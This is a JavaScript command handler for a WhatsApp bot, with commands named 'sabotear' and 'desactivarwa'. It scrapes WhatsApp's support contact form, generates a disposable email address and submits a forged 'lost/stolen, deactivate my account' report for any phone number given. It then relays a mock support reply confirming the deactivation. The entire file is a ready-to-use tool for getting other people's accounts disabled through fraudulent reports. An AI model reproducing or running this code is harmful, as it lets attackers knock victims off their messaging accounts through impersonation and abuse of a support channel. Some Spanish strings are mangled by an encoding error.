import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '*[â—] ð™¸ð™½ð™¶ðšð™´ðš‚ð™´ ð™´ð™» ð™½ðš„ð™¼ð™´ðšð™¾ ðš€ðš„ð™´ ð™³ð™´ðš‚ð™´ð™´ ð™³ð™´ðš‚ð™°ð™²ðšƒð™¸ðš…ð™°ðš ð™´ð™½ ð™µð™¾ðšð™¼ð™°ðšƒð™¾ ð™¸ð™½ðšƒð™´ðšð™½ð™°ð™²ð™¸ð™¾ð™½ð™°ð™», ð™´ð™¹ð™´ð™¼ð™¿ð™»ð™¾: +ðŸ· (ðŸºðŸ»0) 555-555*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`❕𝗗𝗘𝗦𝗔𝗖𝗧𝗜𝗩𝗔𝗡𝗗𝗢❕\n##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta estÃ¡ deshabilitada temporalmente y se eliminarÃ¡ automÃ¡ticamente en 30 dÃ­as si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atenciÃ³n al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el perÃ­odo de cierre:\n â€? Es posible que sus contactos en WhatsApp aÃºn vean su nombre y foto de perfil.\n â€? Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerÃ¡ en estado pendiente por hasta 30 dÃ­as.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el cÃ³digo de 6 dÃ­gitos, el cÃ³digo que recibe por SMS o llamada telefÃ³nica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este nÃºmero de telÃ©fono te pertenece. Por favor, envÃ­anos documentaciÃ³n que nos permita verificar que el nÃºmero es de tu propiedad, como una copia de la factura telefÃ³nica o el contrato de servicio.\n\nPor favor, asegÃºrate de ingresar tu nÃºmero de telÃ©fono en formato internacional completo. Para obtener mÃ¡s informaciÃ³n sobre el formato internacional, consulta este artÃ­culo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.tags = ['owner']
handler.command = /^(supportwa|sabotear|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true 
export default handler
